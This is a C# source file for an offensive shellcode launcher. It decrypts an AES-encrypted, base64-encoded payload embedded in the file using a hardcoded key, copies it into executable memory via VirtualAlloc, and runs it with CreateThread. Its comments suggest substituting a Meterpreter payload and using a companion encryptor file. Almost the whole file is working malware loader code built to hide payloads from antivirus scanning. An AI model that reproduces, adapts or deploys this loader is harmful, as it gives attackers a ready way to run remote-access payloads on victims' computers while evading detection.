using System;
using System.Security.Cryptography;
using System.Text;
using System.Runtime.InteropServices;
using System.IO;

namespace Launcher
{
    static class Program
    {

#region "Win32 InteropServices definitions"

        [DllImport("Kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern IntPtr CreateThread(
            IntPtr lpThreadAttributes,
            UInt32 dwStackSize,
            IntPtr lpStartAddress,
            IntPtr param,
            UInt32 dwCreationFlags,
            ref UInt32 lpThreadId
        );


        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(
            IntPtr lpAddress, 
            uint dwSize, 
            uint flAllocationType, 
            uint flProtect
         );

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern UInt32 WaitForSingleObject(
            IntPtr hHandle, 
            UInt32 dwMilliseconds
        );

#endregion

        static void Main()
        {

            // place your own encrypted base64 aes string in here - e.g. meterpreter payload. Use the encryptor.cs file to create.
            string shellcodeb64 = "VGRqhTVXg1FzldRanZPxr4F0jPl8ReVz9lobdDUou//CqNbtI3EK3m6IIxfgT3ihpsd+rz1Fm1SjFiz/F7DPBffUwQdqmJ/vEHLj35nC6Og2LYZ3OCNsAyDJMp50lFncujDvhXfUaei19hGFOR9ndR03tVwfCfbWabi1vYEXVLPdKVKOssPlcBc2mvcBen6pjXTGEXhQuG03xjg6H8h6GkFPGeiFZXEil6QXCt3oAD6VEQPSclmLasgPSWQnrc7AcETWej6KipoPIipZFk0D4VnJN8mxV9Jihp1vdjek7tCA0FEcB2gFkEDZRqqu+ZoFrOj25WS532D1NdLCpDC86z3EKE+jqzUwJbsHKetCv7B8R2q7ZglrTp2RhA4yqOZp3fW7SlQmf8g6h7oVQIiUyZTsTAubsOQ/4sJdBOk/F4BT3sdWTRKh3DQQi6BnFnS8IfqO/6hAsDjHICejJ+TONOECj8fm8xacnrK1mrDV6UWPqefsEJdlcUDwroDcm/pKYDHXvFA2R+A9PQTpFp2aiK4/xUg9Sl3uzLf66CxuoR8+7zWws4qDSpsbzGcHo5e2nXc1Zfr/XTTinAJoKbeS0RKsRUlQnqAKhqTLmhKETGiGd+zHkwmePqPJB2LBFeZZ6Ia2SCUtvJlpQCR0WSeLWQ808co/w7dVBjNqLnMaLuw=";

            // remember to change the encryption key!
            byte[] dec_shellcode = Decrypt("mykey", shellcodeb64);
            RunShellcode(dec_shellcode);
        }

        public static void RunShellcode(byte[] shellcode)
        {
            // 0x1000 = MEM_COMMIT
            // 0x40 = PAGE_EXECUTE_READWRITE
            IntPtr buffer = VirtualAlloc(IntPtr.Zero, (UInt32)shellcode.Length, 0x1000, 0x40);
            Marshal.Copy(shellcode, 0, (IntPtr)(buffer), shellcode.Length);
            IntPtr thread = IntPtr.Zero;
            UInt32 threadId = 0;
            thread = CreateThread(IntPtr.Zero, 0, buffer, IntPtr.Zero, 0, ref threadId);
            WaitForSingleObject(thread, 0xFFFFFFFF);
        }

        static byte[] Decrypt(string key, string aes_base64)
        {
            byte[] tempKey = Encoding.ASCII.GetBytes(key);
            tempKey = SHA256.Create().ComputeHash(tempKey);

            byte[] data = Convert.FromBase64String(aes_base64);

            // decrypt data
            Aes aes = new AesManaged();
            aes.Mode = CipherMode.CBC;
            aes.Padding = PaddingMode.PKCS7;
            ICryptoTransform dec = aes.CreateDecryptor(tempKey, SubArray(tempKey, 16));

            using (MemoryStream msDecrypt = new MemoryStream())
            {
                using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, dec, CryptoStreamMode.Write))
                {

                    csDecrypt.Write(data, 0, data.Length);

                    return msDecrypt.ToArray();
                }
            }
        }

        static byte[] SubArray(byte[] a, int length)
        {
            byte[] b = new byte[length];
            for (int i = 0; i < length; i++)
            {
                b[i] = a[i];
            }
            return b;
        }
    }
}
